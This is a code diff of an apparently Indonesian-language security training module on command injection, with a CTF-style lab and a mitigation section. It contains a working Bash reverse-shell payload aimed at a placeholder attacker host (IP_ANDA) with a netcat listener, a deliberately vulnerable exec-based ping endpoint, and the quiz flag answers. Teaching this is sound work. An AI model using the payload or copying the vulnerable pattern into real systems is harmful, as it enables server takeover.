@@ -5,44 +5,99 @@ export const commandInjectionModule: CyberSecModule = {
   slug: 'command-injection',
   title: 'Command Injection',
   category: 'Web Exploitation',
-  description: 'Mengeksploitasi fitur web yang menjalankan perintah sistem operasi di backend.',
+  description: 'Menyusupkan instruksi OS (seperti Linux Bash commands) ke dalam antarmuka web, mengakibatkan eksekusi jarak jauh (RCE) langsung di server host.',
   sections: [
     {
-      id: 'concept',
-      title: 'Menyisipkan Perintah Ilegal',
+      id: 'objective',
+      title: 'Mission Objective',
       blocks: [
         {
           id: '1',
-          type: 'text',
-          content: 'Terkadang aplikasi web perlu berinteraksi langsung dengan sistem operasi server. Contoh klasik adalah fitur "Ping" atau "Network Diagnostic" pada router rumah Anda.'
-        },
-        {
-          id: '2',
-          type: 'text',
-          content: 'Jika developer tidak berhati-hati dan meneruskan input Anda langsung ke fungsi seperti `system()`, `exec()`, atau `shell_exec()`, hacker dapat menyisipkan perintah Linux berbahaya menggunakan karakter separator shell.'
-        },
-        {
-          id: '3',
           type: 'alert',
-          content: 'Karakter separator yang sering digunakan: `;` (titik koma), `&&` (AND), `||` (OR), dan `|` (Pipe).',
+          content: 'Target: Layanan diagnostik jaringan perusahaan.\nGoal: Mengeksekusi perintah baca file rahasia (`flag.txt`) yang ada di server backend dengan Remote Command Execution (RCE).',
           metadata: { type: 'warning' }
         }
       ]
     },
     {
-      id: 'interactive-simulator',
-      title: 'Lab Interaktif: Router Ping Tool',
+      id: 'concept',
+      title: 'The Vulnerability (TL;DR)',
       blocks: [
         {
-          id: '4',
+          id: '2',
           type: 'text',
-          content: 'Aplikasi di bawah ini mengeksekusi `ping -c 1 <input>`. Coba tambahkan separator shell (misalnya `;`) untuk menjalankan perintah kedua seperti `ls`.'
+          content: 'Pengembang terkadang terlalu "malas" menulis program dari nol dan justru memanfaatkan utilitas sistem operasi bawaan. Contoh klasik: Fitur "Ping" atau "Traceroute" pada router rumah Anda.'
         },
         {
+          id: '3',
+          type: 'text',
+          content: 'Jika aplikasi web menerima input Anda (misal `192.168.1.1`) dan meneruskannya ke fungsi `system()`, `exec()`, atau `shell_exec()` di PHP/Node.js, ia langsung menjalankan perintah Linux: `ping -c 1 192.168.1.1`.'
+        },
+        {
+          id: '4',
+          type: 'alert',
+          content: 'Karakter Shell Separator (Pemisah Perintah):\n- `;` (Titik koma) -> Menjalankan perintah 1, lalu perintah 2.\n- `&&` (AND logis) -> Menjalankan perintah 2 JIKA perintah 1 berhasil.\n- `||` (OR logis) -> Menjalankan perintah 2 JIKA perintah 1 gagal.\n- `|` (Pipe) -> Mengalirkan output perintah 1 sebagai input perintah 2.',
+          metadata: { type: 'danger' }
+        }
+      ]
+    },
+    {
+      id: 'real-world-ctf',
+      title: 'Real-World CTF Approach (Tooling & Reverse Shells)',
+      blocks: [
+        {
           id: '5',
+          type: 'text',
+          content: 'Di kompetisi CTF, jika Anda menemukan celah Command Injection, langkah pertama adalah memverifikasi RCE dengan perintah sederhana seperti `whoami` atau `id`. Jika berhasil, target selanjutnya adalah mendapatkan **Reverse Shell** agar Anda tidak perlu terus-menerus mengetik injeksi di URL/Form.'
+        },
+        {
+          id: '6',
+          type: 'code',
+          content: `# Di terminal komputer Anda (Attacker), buka port untuk mendengarkan:\nnc -lnvp 1337\n\n# Di web target (sebagai payload injeksi), kirimkan Bash Reverse Shell:\n8.8.8.8; bash -i >& /dev/tcp/IP_ANDA/1337 0>&1`,
+          metadata: { language: 'bash' }
+        },
+        {
+          id: '7',
+          type: 'text',
+          content: 'Aplikasi web korban akan secara diam-diam membuka koneksi balik ke terminal Anda, memberikan akses kontrol penuh secara interaktif ke server.'
+        }
+      ]
+    },
+    {
+      id: 'interactive-simulator',
+      title: 'Live Lab: Backend Execution',
+      blocks: [
+        {
+          id: '8',
+          type: 'text',
+          content: 'Aplikasi di bawah ini mengeksekusi fungsi `exec("ping -c 1 " + req.body.ip)` pada server backend Node.js (di `http://localhost:3001/api/ping`).'
+        },
+        {
+          id: '9',
+          type: 'text',
+          content: 'Tugas Anda: Tambahkan separator shell (misalnya `;`) untuk menjeda perintah ping dan memerintahkan server mencetak isi folder dengan `ls`, lalu membaca file berharga (`cat`).'
+        },
+        {
+          id: '10',
           type: 'interactive',
           content: 'MockCmdInjection',
           metadata: { component: 'MockCmdInjection' }
+        }
+      ]
+    },
+    {
+      id: 'mitigation',
+      title: 'The Fix (Mitigasi)',
+      blocks: [
+        {
+          id: '11',
+          type: 'text',
+          content: 'Jangan pernah meneruskan input string user secara langsung ke `exec` atau sistem shell. Gunakan API OS bawaan bahasa pemrograman jika tersedia (misalnya pustaka `net` untuk TCP ping daripada memanggil binary OS).'
+        },
+        {
+          id: '12',
+          type: 'text',
+          content: 'Jika Anda harus memanggil binary, gunakan fungsi yang tidak melewati *shell interpreter* (seperti `execFile` di Node.js atau `escapeshellarg()` di PHP) yang menganggap semua input sebagai argumen kaku (string literal) dan bukan shell meta-karakter.'
         }
       ]
     }
@@ -50,8 +105,8 @@ export const commandInjectionModule: CyberSecModule = {
   quiz: {
     id: 'q_cmd_1',
     type: 'flag_submission',
-    question: 'Eksploitasi alat Ping di atas untuk membaca isi dari file flag.txt. Masukkan flag yang Anda temukan:',
-    flag: 'INIT0{cmd_1nj3ct10n_m4st3r}',
-    explanation: 'Kerja bagus! Anda telah berhasil mengeksekusi Arbitrary Command Execution pada server target.'
+    question: 'Berdasarkan uji coba di Live Lab di atas, gunakan `ls` untuk mencari file yang mencurigakan, kemudian baca isinya dengan `cat` untuk mendapatkan hadiah Anda:',
+    flag: 'INIT0{RCE_V1a_P1ng_Ut1l}',
+    explanation: 'Target Compromised! Anda berhasil merangkai beberapa baris perintah OS Linux menggunakan Shell Separators (`;`). Command Injection sangat mematikan karena ia merupakan pintu langsung ke layer Sistem Operasi host.'
   }
 };
